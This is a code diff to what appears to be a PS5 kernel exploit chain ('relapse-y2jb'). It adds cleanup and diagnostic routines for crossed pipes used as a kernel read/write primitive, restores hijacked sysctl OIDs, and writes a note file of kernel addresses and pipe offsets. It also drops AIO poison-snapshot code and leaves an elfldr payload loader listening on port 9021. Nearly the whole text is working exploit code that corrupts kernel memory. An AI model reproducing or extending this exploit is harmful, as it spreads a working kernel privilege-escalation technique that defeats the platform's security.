@@ -11,7 +11,7 @@
         const ALLOW_AFTER_P2JB = false;
         const PREPARE_FOR_KEXP = true;
         const WIDEN_EBOOT = true;
-        const FHOLD_PIPES = true;
+        const FHOLD_PIPES = false;
         const SKIP_HANDOFF = false;
         const STOP_AFTER = null;
         const CLOSE_PIPES_AFTER_RUN = false;
@@ -19,7 +19,20 @@
         const AIO_DUMP_AFTER_RELEASE = false;
         const AIO_LEAK_ON_EXIT = false;
         const AIO_POISON_SNAPSHOT = false;
-        const POISON_SNAPSHOT_MAX = 400;
+        const POISON_ID_MAX = 512;        // ids examined (5 pipe reads each)
+        const POISON_SNAPSHOT_MAX = 32;   // objects dumped (5 reads each)
+        const POISON_WAITER_MAX = 64;
+        const AIO_POISON_SCRUB = false;
+        const AIO_CANCEL_ALL = false;
+        const EXIT_TEST = null;
+        const SKIP_RELEASE_WORKERS = false;
+        const CLEAN_TEARDOWN = false;
+        const RESTORE_REAL_BUFFERS = false;
+        const LEAVE_PIPES_ARMED = true;
+        const PIPE_STRUCT_DIFF = false;
+        const PIPE_NOTE_FOR_CLEANER = true;
+        const SKIP_OID_RESTORE = false;
+        const FHOLD_AT_RESCUE = false;
         const CRASH_ARTIFACT_SCAN = false;
         const DIAGNOSE_AFTER_HANDOFF = false;
         const STABILIZE_CREDS = false;
@@ -4839,11 +4852,6 @@
             let accepted = 0;
             for (let i = 0; i < sprays; i++)
               if ((this.readU32(returns, i * 8) | 0) === 0) accepted++;
-            if (typeof AIO_POISON_SNAPSHOT !== "undefined" && AIO_POISON_SNAPSHOT) {
-              const sprayed = this.sprayedIds || (this.sprayedIds = []);
-              for (let i = 0; i < sprays * requests; i++)
-                sprayed.push(this.readU32(sprayedIds, i * 4) >>> 0);
-            }
             return accepted;
           }
           async cancelRequest(group, index) {
@@ -5192,6 +5200,9 @@
             const victim = this.victim.pipe;
             const { count, in: inOff, out: outOff, size, buffer } = this.off.pipe;
             this.pipeSize = this.off.pipe.defaultSize;
+            if ((typeof RESTORE_REAL_BUFFERS !== "undefined" && RESTORE_REAL_BUFFERS) ||
+                (typeof PIPE_NOTE_FOR_CLEANER !== "undefined" && PIPE_NOTE_FOR_CLEANER))
+              await this.savePipeBuffers();
             this.aimBuffer = this.alloc(0x20);
             this.drainBuffer = this.alloc(0x40);
             const inValue = await this.kread32(master.add32(inOff));
@@ -5407,19 +5418,8 @@
                     (eboot ? "0x" + eboot.toString() : "invalid") +
                     ") - the shellcode may not resolve its imports");
                 }
-                let held = 0;
-                const holdFds = (typeof FHOLD_PIPES === "undefined" || FHOLD_PIPES)
-                  ? [this.master.readFd, this.master.writeFd,
-                    this.victim.readFd, this.victim.writeFd]
-                  : [];
-                for (const fd of holdFds) {
-                  const fp = await this.fileOf(fd);
-                  if (!isKptr(fp)) continue;
-                  const rc = await this.readKernel32(fp.add32(0x28));
-                  if (rc <= 0 || rc >= 0x10000) continue;
-                  if (await this.writeKernel32(fp.add32(0x28), rc + 1)) held++;
-                }
-                await asay("handoff 0b: fhold on " + held + "/4 pipe files");
+                if (typeof FHOLD_PIPES === "undefined" || FHOLD_PIPES)
+                  await this.holdPipeFiles("handoff 0b");
               }
             }
             if (typeof PROBE_DLSYM !== "undefined" && PROBE_DLSYM &&
@@ -5667,12 +5667,211 @@
                 ", masterOk=" + masterOk + ") - closing the host app may still panic");
             return clean;
           }
+          async savePipeBuffers() {
+            const { buffer, size } = this.off.pipe;
+            const bm = await this.kread64(this.master.pipe.add32(buffer));
+            const bs = await this.kread32(this.master.pipe.add32(size));
+            const bv = await this.kread64(this.victim.pipe.add32(buffer));
+            const vs = await this.kread32(this.victim.pipe.add32(size));
+            if (bm.rv !== 0 || bv.rv !== 0) {
+              this.report("pipes", "could not read the real buffers before crossing - " +
+                "restoreRealBuffers() will have nothing to restore");
+              return false;
+            }
+            this.savedBuffers = { master: bm.value, masterSize: bs.value,
+              victim: bv.value, victimSize: vs.value };
+            this.report("pipes", "saved real buffers before crossing: master 0x" +
+              bm.value.toString() + " size " + bs.value + ", victim 0x" +
+              bv.value.toString() + " size " + vs.value);
+            return true;
+          }
+          async restoreRealBuffers() {
+            const s = this.savedBuffers;
+            if (!s) {
+              this.report("pipes", "no saved buffers - cannot restore");
+              return false;
+            }
+            const { buffer, count, in: inOff, out: outOff, size } = this.off.pipe;
+            let ok = 0;
+            const tried = 10;
+            for (const [p, b, sz] of [[this.master.pipe, s.master, s.masterSize],
+              [this.victim.pipe, s.victim, s.victimSize]]) {
+              if ((await this.kwrite64(p.add32(buffer), b)) === 0) ok++;
+              if ((await this.kwrite32(p.add32(size), sz)) === 0) ok++;
+              for (const off of [count, inOff, outOff])
+                if ((await this.kwrite32(p.add32(off), 0)) === 0) ok++;
+            }
+            const mb = await this.kread64(this.master.pipe.add32(buffer));
+            const vb = await this.kread64(this.victim.pipe.add32(buffer));
+            const good = mb.value.low === s.master.low && mb.value.hi === s.master.hi &&
+              vb.value.low === s.victim.low && vb.value.hi === s.victim.hi;
+            this.disarmed = good;
+            this.report("pipes", good
+              ? "both real buffers restored and verified (" + ok + "/" + tried +
+                " writes ok) - the pair now looks like an ordinary used pipe"
+              : "BUFFER RESTORE FAILED (" + ok + "/" + tried + " writes, master 0x" +
+                mb.value.toString() + " want 0x" + s.master.toString() + ", victim 0x" +
+                vb.value.toString() + " want 0x" + s.victim.toString() +
+                ") - closing the host app may still panic");
+            return good;
+          }
+          async restoreOidsSlow() {
+            const { a, b, c, originalKind } = this.off.oid;
+            const step = async (what, fn) => {
+              const rv = await fn();
+              this.report("Cleanup", "slow-oid " + what + (rv === undefined ? " done" : " rv " + rv));
+              return rv;
+            };
+            for (const [n, oid] of [["a", a], ["b", b], ["c", c]])
+              await step("arg1(" + n + ")", async () => {
+                await this.kwrite64(this.kaddr(oid.arg1), this.kaddr(oid.arg1Value));
+              });
+            for (const [n, oid] of [["a", a], ["b", b], ["c", c]])
+              await step("kind(" + n + ")", async () =>
+                this.kwrite32(this.kaddr(oid.kind), originalKind));
+            await step("b.visible", async () => this.kwrite32(this.kaddr(b.visible), 0));
+            await step("a.deadSink", async () => this.kwrite32(this.kaddr(a.deadSink), 0));
+            await step("walkCounter", async () =>
+              this.kwrite32(this.kaddr(this.off.walkCounter.addr), 0));
+            this.mibC = null;
+            this.oidsRestored = true;
+            const cpus = await this.sysctlReadInt(this.mibA);
+            const stillVisible = (await this.oidKind(this.mibB)) !== null;
+            const ok = cpus.rv === 0 && !stillVisible;
+            this.report("Cleanup", ok
+              ? "oids restored through the slow window (pipes already disarmed)"
+              : "SLOW OID RESTORE CHECK FAILED (kern.smp.cpus rv " + cpus.rv +
+                ", oid b still visible: " + stillVisible + ")");
+            return ok;
+          }
+          async dumpPipeStructs(label, useSlow) {
+            const H = (v) => (v === null ? "-" : "0x" + v.toString());
+            const rd = useSlow
+              ? async (addr) => { const r = await this.kread64(addr); return r.rv === 0 ? r.value : null; }
+              : async (addr) => this.readKernel64(addr);
+            try {
+              if (!this.master || !this.victim) { this.report(label, "no pipes"); return; }
+              if (!this.curproc) await this.findCurrentProcess();
+              const fdField = this.curproc.add32(this.off.proc.fd);
+              const fdp = useSlow ? (await this.kread64(fdField)).value : await this.fptr(fdField);
+              if (!fdp || !this.isKernelPointer(fdp)) { this.report(label, "no fd table"); return; }
+              const pair = this.alloc(16);
+              this.clear(pair, 16);
+              if ((await this.sysInt(SYS_PIPE2, pair, 0)) !== 0) {
+                this.report(label, "could not create the reference pipe");
+                return;
+              }
+              const refFd = this.readU32(pair, 0) | 0;
+              this.fds.push(refFd, this.readU32(pair, 4) | 0);
+              const ref = await this.findPipe(fdp, refFd, "reference");
+              if (!ref || !ref.pipe) { this.report(label, "reference pipe unresolved"); return; }
+              const { buffer, count, in: inOff, out: outOff, size } = this.off.pipe;
+              const known = {};
+              known[buffer] = "buffer"; known[count] = "count"; known[inOff] = "in";
+              known[outOff] = "out"; known[size] = "size";
+              const dumps = {};
+              for (const [name, addr] of [["master", this.master.pipe],
+                                          ["victim", this.victim.pipe],
+                                          ["reference", ref.pipe]]) {
+                const words = [];
+                for (let off = 0; off < 0x100; off += 8) {
+                  const w = await rd(addr.add32(off));
+                  words.push(w === null ? "?" : w.toString());
+                }
+                dumps[name] = words;
+                this.report(label, name + " @ " + H(addr));
+              }
+              for (const name of ["master", "victim"]) {
+                const diffs = [];
+                for (let i = 0; i < 0x100 / 8; i++) {
+                  const off = i * 8;
+                  if (dumps[name][i] !== dumps.reference[i])
+                    diffs.push("+0x" + off.toString(16) + (known[off] ? " (" + known[off] + ")" : "") +
+                      ": " + name + "=" + dumps[name][i] + " fresh=" + dumps.reference[i]);
+                }
+                this.report(label, name + " differs from a fresh pipe at " + diffs.length + " qword(s)");
+                for (const d of diffs.slice(0, 16)) this.report(label, "  " + d);
+              }
+            } catch (e) {
+              this.report(label, "failed: " + e.message);
+            }
+          }
+          async makeReferencePipe(label) {
+            try {
+              const pair = this.alloc(16);
+              this.clear(pair, 16);
+              if ((await this.sysInt(SYS_PIPE2, pair, 0)) !== 0) {
+                this.report(label, "pipe2 failed");
+                return null;
+              }
+              const readFd = this.readU32(pair, 0) | 0;
+              const writeFd = this.readU32(pair, 4) | 0;
+              this.fds.push(readFd, writeFd);
+              const fdp = await this.fptr(this.curproc.add32(this.off.proc.fd));
+              if (!fdp) { this.report(label, "no fd table"); return null; }
+              const info = await this.findPipe(fdp, readFd, "reference");
+              if (!info || !info.pipe) { this.report(label, "reference pipe unresolved"); return null; }
+              this.refPipe = info.pipe;
+              this.report(label, "reference pipe @ 0x" + info.pipe.toString() +
+                " (fds " + readFd + "/" + writeFd + ", never written)");
+              return info.pipe;
+            } catch (e) {
+              this.report(label, "failed: " + e.message);
+              return null;
+            }
+          }
+          async cleanTeardown() {
+            if (typeof PIPE_STRUCT_DIFF !== "undefined" && PIPE_STRUCT_DIFF && this.crossed)
+              await this.dumpPipeStructs("pipe-diff-crossed", false);
+            if (typeof AIO_POISON_SNAPSHOT !== "undefined" &&
+                AIO_POISON_SNAPSHOT && this.crossed)
+              await this.verifyAioPoison("poison-verify");
+            if (typeof AIO_POISON_SCRUB !== "undefined" && AIO_POISON_SCRUB && this.crossed)
+              await this.scrubAioPoison("poison-scrub");
+            let disarmed;
+            if (!this.crossed) {
+              disarmed = true;
+            } else if (typeof RESTORE_REAL_BUFFERS !== "undefined" && RESTORE_REAL_BUFFERS) {
+              disarmed = await this.restoreRealBuffers();
+              if (!disarmed) {
+                this.report("Cleanup", "restore failed - falling back to zeroing the buffers, " +
+                  "which is the state Build U panicked from");
+                disarmed = await this.disarmPipes();
+              }
+            } else {
+              disarmed = await this.disarmPipes();
+            }
+            this.crossed = false;
+            this.report("Cleanup", "pipes made safe: " + disarmed +
+              (disarmed ? "" : " - a pipe may still be armed, closing the host app can panic"));
+            if (typeof PIPE_STRUCT_DIFF !== "undefined" && PIPE_STRUCT_DIFF)
+              await this.dumpPipeStructs("pipe-diff-disarmed", true);
+            if (typeof SKIP_OID_RESTORE !== "undefined" && SKIP_OID_RESTORE) {
+              this.report("Cleanup", "SKIP_OID_RESTORE: pipes disarmed, OIDs left hijacked " +
+                "(the slow window cannot restore its own writable kind)");
+              this.oidsRestored = false;
+            } else {
+              this.report("Cleanup", "slow-oid restore starting (window still hijacked)");
+              await this.restoreOidsSlow();
+            }
+            if (typeof SKIP_RELEASE_WORKERS !== "undefined" && SKIP_RELEASE_WORKERS)
+              this.report("Cleanup", "SKIP_RELEASE_WORKERS: leaving the aio workers parked");
+            else await this.releaseAioWorkers();
+            await sleep(200);
+            await this.closeScratchDescriptors();
+            this.report("Cleanup", "clean teardown done: pipes disarmed, groups defused, " +
+              "oids restored, workers released, scratch fds closed");
+          }
+          async fptr(address) {
+            const v = await this.readKernel64(address);
+            return this.isKernelPointer(v) ? v : null;
+          }
           async aioSlot(table, id) {
             const { pages, slotStride } = this.off.aio.idTable;
             const index = id & 0x1fff;
             const pageCount = await this.readKernel32(table.add32(pages));
             if (pageCount === 0 || pageCount > 64 || index >= (pageCount << 7)) return null;
-            const page = await this.readKernelPointer(table.add32((index >>> 7) * 8));
+            const page = await this.fptr(table.add32((index >>> 7) * 8));
             if (!page) return null;
             const slot = page.add32((id & 0x7f) * slotStride);
             const w24 = await this.readKernel32(slot.add32(0x24));
@@ -5682,7 +5881,7 @@
               state: w24 >>> 16,
               freeNext: w24 & 0xffff,
               gen: await this.readKernel32(slot.add32(0x28)),
-              obj: await this.readKernelPointer(slot.add32(0x10)),
+              obj: await this.fptr(slot.add32(0x10)),
             };
           }
           async dumpAioState(label) {
@@ -5690,7 +5889,7 @@
             const H = (v) => (v === null ? "-" : "0x" + v.toString());
             try {
               if (!this.curproc) await this.findCurrentProcess();
-              const table = await this.readKernelPointer(
+              const table = await this.fptr(
                 this.curproc.add32(this.off.proc.aioInfo));
               if (!table) { this.report(label, "p_aioinfo is NULL"); return; }
               const head = [];
@@ -5715,14 +5914,16 @@
                 const key = "armed type=" + (s.type & 0xffff) + " state=" + s.state;
                 tally[key] = (tally[key] || 0) + 1;
                 if (s.obj) {
-                  const gState = await this.readKernel32(s.obj.add32(state));
-                  const gNum = await this.readKernel32(s.obj.add32(num));
-                  const gWait = await this.readKernel64(s.obj.add32(waiters));
-                  if (gWait.low !== 0 || gWait.hi !== 0) armedLeft++;
+                  const shared = await this.fptr(s.obj.add32(0x10));
+                  const gState = shared ? await this.readKernel32(shared.add32(state)) : -1;
+                  const gNum = shared ? await this.readKernel32(shared.add32(num)) : -1;
+                  const gWait = shared ? await this.readKernel64(shared.add32(waiters)) : null;
+                  if (gWait && (gWait.low !== 0 || gWait.hi !== 0)) armedLeft++;
                   if (samples.length < 6)
-                    samples.push("  id " + id + " obj " + H(s.obj) + " num " + gNum +
-                      " state " + gState + " waiters " + H(gWait) +
-                      (gWait.low === 0 && gWait.hi === 0 ? " (clear)" : "  <-- STILL ARMED"));
+                    samples.push("  id " + id + " obj " + H(s.obj) + " shared " + H(shared) +
+                      " num " + gNum + " state " + gState + " waiters " + H(gWait) +
+                      (!gWait ? " (unreachable)" :
+                        (gWait.low === 0 && gWait.hi === 0 ? " (clear)" : "  <-- STILL ARMED")));
                 } else if (samples.length < 6) {
                   samples.push("  id " + id + " obj - (slot type " + s.type +
                     " state " + s.state + " gen " + s.gen + ")");
@@ -5754,10 +5955,10 @@
             try {
               if (!this.curproc) await this.findCurrentProcess();
               const field = this.curproc.add32(this.off.proc.aioInfo);
-              const before = await this.readKernelPointer(field);
+              const before = await this.fptr(field);
               if (!before) { this.report(label, "p_aioinfo already NULL"); return; }
               const ok = await this.writeKernel64(field, 0, 0);
-              const after = await this.readKernelPointer(field);
+              const after = await this.fptr(field);
               this.report(label, "p_aioinfo " + H(before) + " -> " + H(after) +
                 " (wrote " + (ok ? "ok" : "FAILED") + ") - the aio structures are " +
                 "leaked on purpose so process exit does not walk them");
@@ -5765,114 +5966,13 @@
               this.report(label, "failed: " + e.message);
             }
           }
-          async snapshotAioPoison(label) {
-            const H = (v) => (v === null ? "-" : "0x" + v.toString());
-            const K = (v) => v !== null && ((v.hi >>> 16) === 0xffff);
-            try {
-              if (!this.curproc) await this.findCurrentProcess();
-              const table = await this.readKernelPointer(
-                this.curproc.add32(this.off.proc.aioInfo));
-              const sprayIds = this.sprayedIds || [];
-              const ids = [];
-              for (const g of this.armedGroups) for (const id of g) ids.push(["armed", id]);
-              for (const id of sprayIds) ids.push(["spray", id]);
-              const nodeMutex = this.kaddr(this.off.nodeMutex);
-              this.report(label, "p_aioinfo " + H(table) + ", " + ids.length +
-                " ids (" + (ids.length - sprayIds.length) + " armed, " + sprayIds.length +
-                " sprayed), kbase 0x" + this.kbase.toString() +
-                ", nodeMutex 0x" + nodeMutex.toString());
-              if (!table) {
-                this.report(label, "p_aioinfo is NULL - the objects are unreachable " +
-                  "from the process, so this pass cannot enumerate them");
-                this.poisonSnapshot = [];
-                return;
-              }
-              const seen = {};
-              const snap = [];
-              const cap = (typeof POISON_SNAPSHOT_MAX !== "undefined" && POISON_SNAPSHOT_MAX) || 400;
-              let noSlot = 0, noObj = 0, unreadable = 0, poisoned = 0, other = 0, capped = 0;
-              const samples = [];
-              for (const [kind, id] of ids) {
-                const s = await this.aioSlot(table, id);
-                if (!s) { noSlot++; continue; }
-                if (!s.obj) { noObj++; continue; }
-                const key = s.obj.toString();
-                if (seen[key]) continue;
-                seen[key] = true;
-                if (snap.length >= cap) { capped++; continue; }
-                const words = [];
-                let ok = true;
-                for (let off = 0; off < 0x40; off += 8) {
-                  const w = await this.readKernel64(s.obj.add32(off));
-                  if (w === null) { ok = false; break; }
-                  words.push(w);
-                }
-                if (!ok) { unreadable++; continue; }
-                const sig = K(words[0]) && K(words[1]) &&
-                  words[2].toString() === nodeMutex.toString();
-                if (sig) poisoned++; else other++;
-                snap.push({ kind: kind, id: id, obj: s.obj, words: words, sig: sig,
-                  type: s.type & 0xffff, state: s.state, gen: s.gen });
-                if (samples.length < 10)
-                  samples.push("  " + kind + " id " + id + " obj " + H(s.obj) +
-                    " type " + (s.type & 0xffff) + " state " + s.state + " gen " +
-                    s.gen + (sig ? "  <-- SIGNATURE" : "") + "\n    " +
-                    words.map((w, i) => "+" + (i * 8).toString(16) + "=0x" +
-                      w.toString()).join(" "));
-              }
-              this.poisonSnapshot = snap;
-              this.report(label, snap.length + " unique objects: " + poisoned +
-                " carrying the fake-node signature, " + other + " other, " + noSlot +
-                " ids with no slot, " + noObj + " slots with no object, " + unreadable +
-                " unreadable" + (capped ? ", " + capped + " more left unread (cap " +
-                cap + ")" : ""));
-              for (const s of samples) this.report(label, s);
-            } catch (e) {
-              this.report(label, "snapshot failed: " + e.message);
-            }
-          }
-          async verifyAioPoison(label) {
-            const H = (v) => (v === null ? "-" : "0x" + v.toString());
-            try {
-              const snap = this.poisonSnapshot || [];
-              if (!snap.length) {
-                this.report(label, "nothing was snapshotted - pass 1 found no objects");
-                return;
-              }
-              let same = 0, sigLeft = 0, changed = 0, unreadable = 0;
-              const samples = [];
-              for (const e of snap) {
-                const now = [];
-                let ok = true;
-                for (let off = 0; off < 0x40; off += 8) {
-                  const w = await this.readKernel64(e.obj.add32(off));
-                  if (w === null) { ok = false; break; }
-                  now.push(w);
-                }
-                if (!ok) { unreadable++; continue; }
-                const identical = now.every((w, i) => w.toString() === e.words[i].toString());
-                if (identical) {
-                  same++;
-                  if (e.sig) sigLeft++;
-                  continue;
-                }
-                changed++;
-                if (samples.length < 10)
-                  samples.push("  " + e.kind + " id " + e.id + " obj " + H(e.obj) +
-                    (e.sig ? " (had SIGNATURE)" : "") + "\n    was " +
-                    e.words.map((w) => w.toString()).join(" ") + "\n    now " +
-                    now.map((w) => w.toString()).join(" "));
-              }
-              this.report(label, "re-read " + snap.length + " objects: " + same +
-                " byte-identical (" + sigLeft + " of them still carrying the " +
-                "fake-node signature), " + changed + " changed since the race, " +
-                unreadable + " now unreadable");
-              for (const s of samples) this.report(label, s);
-            } catch (e) {
-              this.report(label, "verify failed: " + e.message);
-            }
-          }
           async restorePipes() {
+            if (typeof LEAVE_PIPES_ARMED !== "undefined" && LEAVE_PIPES_ARMED) {
+              this.report("pipes", "LEAVE_PIPES_ARMED: the pair stays crossed so elfldr keeps " +
+                "kernel r/w. Send tools/pipeclean/pipeclean.elf to :9021 BEFORE closing the " +
+                "app - closing with the pipes still armed panics the console.");
+              return;
+            }
             if (this.disarmed) return;
             if (!this.crossed) return;
             this.crossed = false;
@@ -5919,15 +6019,20 @@
               if (!(await this.findCurrentProcess()))
                 return this.stop("curproc not found");
               if (!(await this.locatePipes())) return this.stop("pipes not located");
+              if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "locate")
+                return this.stop("STOP_AFTER=locate - both pipe pairs created and located, " +
+                  "never crossed, fast r/w never established");
               if (!(await this.crossPipes()))
                 return this.stop("fast read and write not established");
               this.report("Kernel", "fast read and write ready");
-              if (typeof AIO_POISON_SNAPSHOT !== "undefined" && AIO_POISON_SNAPSHOT)
-                await this.snapshotAioPoison("poison-snap");
               if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "fast")
                 return this.stop("STOP_AFTER=fast - pipes crossed, aio groups still armed");
               this.report("Kernel", "checking aio groups");
-              await this.defuseAioGroups();
+              if (typeof CLEAN_TEARDOWN !== "undefined" && CLEAN_TEARDOWN)
+                this.report("Kernel", "CLEAN_TEARDOWN: the group defuse is deferred to " +
+                  "rescue(), so the slow window is still alive when the pipes are " +
+                  "disarmed");
+              else await this.defuseAioGroups();
               if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "defuse")
                 return this.stop("STOP_AFTER=defuse - aio groups cleared, privileges untouched");
               this.report("Kernel", "checking privileges");
@@ -5960,18 +6065,38 @@
                 if (this.curproc) await this.defuseAioGroups();
                 else this.report("Cleanup", "current process unavailable");
               }
-              await this.restoreOids();
-              await this.releaseAioWorkers();
+              if (typeof CLEAN_TEARDOWN !== "undefined" && CLEAN_TEARDOWN) {
+                await this.cleanTeardown();
+                return;
+              }
+              if (typeof PIPE_NOTE_FOR_CLEANER !== "undefined" && PIPE_NOTE_FOR_CLEANER)
+                await this.makeReferencePipe("pipe-ref");
+              if (typeof SKIP_OID_RESTORE !== "undefined" && SKIP_OID_RESTORE)
+                this.report("Cleanup", "SKIP_OID_RESTORE: the sysctl OIDs are being left " +
+                  "hijacked on purpose - diagnostic build, the window stays open");
+              else await this.restoreOids();
+              if (typeof AIO_POISON_SNAPSHOT !== "undefined" &&
+                  AIO_POISON_SNAPSHOT && this.crossed)
+                await this.verifyAioPoison("poison-verify");
+              if (typeof AIO_POISON_SCRUB !== "undefined" &&
+                  AIO_POISON_SCRUB && this.crossed)
+                await this.scrubAioPoison("poison-scrub");
+              if (typeof SKIP_RELEASE_WORKERS !== "undefined" && SKIP_RELEASE_WORKERS)
+                this.report("Cleanup", "SKIP_RELEASE_WORKERS: leaving the aio workers parked");
+              else await this.releaseAioWorkers();
               await sleep(200);
               if (typeof AIO_DUMP_AFTER_RELEASE !== "undefined" &&
                   AIO_DUMP_AFTER_RELEASE && this.crossed)
                 await this.dumpAioState("aio-dump");
-              if (typeof AIO_POISON_SNAPSHOT !== "undefined" &&
-                  AIO_POISON_SNAPSHOT && this.crossed)
-                await this.verifyAioPoison("poison-verify");
+              if (typeof AIO_CANCEL_ALL !== "undefined" && AIO_CANCEL_ALL) {
+                await this.cancelAllAio("aio-cancel");
+                if (this.crossed) await this.dumpAioState("aio-after-cancel");
+              }
               if (typeof AIO_LEAK_ON_EXIT !== "undefined" && AIO_LEAK_ON_EXIT &&
                   this.crossed)
                 await this.leakAioInfo("aio-leak");
+              if (typeof FHOLD_AT_RESCUE !== "undefined" && FHOLD_AT_RESCUE)
+                await this.holdPipeFiles("rescue fhold");
               await this.restorePipes();
               await this.closeScratchDescriptors();
             } catch {
@@ -6031,10 +6156,6 @@
         send_notification(relapse_version + "\nFW " + FW_VERSION + "\n" +
             (typeof version_string === "string" ? version_string : "Y2JB"));
         say("relapse-y2jb starting");
-        if (CRASH_ARTIFACT_SCAN) {
-            try { scan_crash_artifacts(); }
-            catch (e) { say("crash-artifact scan threw " + e.message); }
-        }
         if (typeof is_jailbroken === "function" && is_jailbroken()) {
             send_notification("relapse: already jailbroken");
             say("already jailbroken - nothing to do");
@@ -6195,10 +6316,65 @@
         } catch (e) {
             log_now("could not install the seal hook: " + e.message);
         }
+        if (PIPE_NOTE_FOR_CLEANER && exploit.master && exploit.victim) {
+            try {
+                const pp = exploit.off.pipe;
+                const hex = (v) => "0x" + (v === undefined ? "e8" : v.toString(16));
+                const logip = net_log_target ? net_log_target.split(":")[0] : "";
+                const note = "logip=" + logip + "\n" +
+                    "pid=" + Number(syscall(SYSCALL.getpid)) + "\n" +
+                    "master=0x" + exploit.master.pipe.toString() + "\n" +
+                    "victim=0x" + exploit.victim.pipe.toString() + "\n" +
+                    "reference=0x" + (exploit.refPipe ? exploit.refPipe.toString() : "0") + "\n" +
+                    "kbase=0x" + (exploit.kbase ? exploit.kbase.toString() : "0") + "\n" +
+                    "allproc=0x" + exploit.kaddr(exploit.off.allproc).toString() + "\n" +
+                    "master_buf=0x" + (exploit.savedBuffers && exploit.savedBuffers.master ? exploit.savedBuffers.master.toString() : "0") + "\n" +
+                    "victim_buf=0x" + (exploit.savedBuffers && exploit.savedBuffers.victim ? exploit.savedBuffers.victim.toString() : "0") + "\n" +
+                    "pipe_size=" + (exploit.savedBuffers ? exploit.savedBuffers.masterSize : 0) + "\n" +
+                    "off_buffer=" + hex(pp.buffer) + "\n" +
+                    "off_count=" + hex(pp.count) + "\n" +
+                    "off_in=" + hex(pp.in) + "\n" +
+                    "off_out=" + hex(pp.out) + "\n" +
+                    "off_size=" + hex(pp.size) + "\n" +
+                    "off_pair=" + hex(pp.pair) + "\n";
+                const dirs = ["/user/temp/common_temp"];
+                try { dirs.unshift("/" + get_nidpath() + "/common_temp"); } catch (_) { }
+                let wrote = 0;
+                for (const d of dirs) {
+                    try {
+                        write_file(d + "/relapse-pipes.txt", note);
+                        wrote++;
+                        say("pipe note written to " + d + "/relapse-pipes.txt");
+                    } catch (e) {
+                        say("pipe note not written to " + d + ": " + e.message);
+                    }
+                }
+                if (wrote) say("pipe note: " + note.replace(/\n/g, " ") +
+                    "  <- send pipeclean.elf to :9021 to seal the pipes, then close the app");
+                else say("PIPE_NOTE_FOR_CLEANER: no writable directory for the note");
+            } catch (e) {
+                say("pipe note failed: " + e.message);
+            }
+        }
+        if (CRASH_ARTIFACT_SCAN) {
+            try { scan_crash_artifacts(); }
+            catch (e) { say("crash-artifact scan threw " + e.message); }
+        }
         await log("[relapse] === relapse complete ===");
         await log("[relapse] elfldr listening on :9021 (pipes and sysctl OIDs " +
             "torn down, eboot segments restored - upstream rescue() state)");
         send_notification("relapse complete\nelfldr on <ps5-ip>:9021");
+        if (EXIT_TEST === "sigkill" || EXIT_TEST === "exit") {
+            const pid = syscall(SYSCALL.getpid);
+            say("EXIT_TEST=" + EXIT_TEST + ": ending this process (pid " + pid +
+                ") in 2s - if the console survives, the panic belongs to the " +
+                "graceful close path and not to the aio residue");
+            await sleep(2000);
+            if (EXIT_TEST === "sigkill") syscall(SYSCALL.kill, pid, 9n);
+            else syscall(1n /* SYS_exit */, 0n);
+            say("EXIT_TEST: the process is still here - the exit call returned " +
+                "(kill " + EXIT_TEST + " did not take effect)");
+        }
     } catch (e) {
         try { log_now("FATAL: " + e.message); } catch (_) { }
         try { send_notification("relapse FAILED: " + e.message); } catch (_) { }
